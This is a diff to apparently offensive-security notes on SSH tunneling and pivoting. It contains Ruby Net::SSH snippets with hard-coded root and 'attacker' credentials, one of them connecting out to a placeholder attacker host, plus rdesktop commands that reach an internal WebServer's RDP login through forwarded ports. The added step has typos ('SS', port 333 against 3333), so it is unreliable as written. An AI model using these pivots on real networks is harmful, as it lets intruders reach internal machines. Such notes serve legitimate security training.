@@ -63,7 +63,7 @@ Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|
 end
 ```
 
-Now connect to the **SSH Server** on port 3333 from your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
+Now connect to the **SSH Server** on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
 
 ```
 rdesktop WebServer:3333
@@ -84,6 +84,11 @@ Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
 end
 ```
 
+Now SS from the **SSH Server** to **localhost** on your localhost ssh port then  connect from your localhost to your localhost on port 333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
+
+```
+rdesktop localhost:3333
+```
 
 ### Reverse SSH Tunnel 
 ```
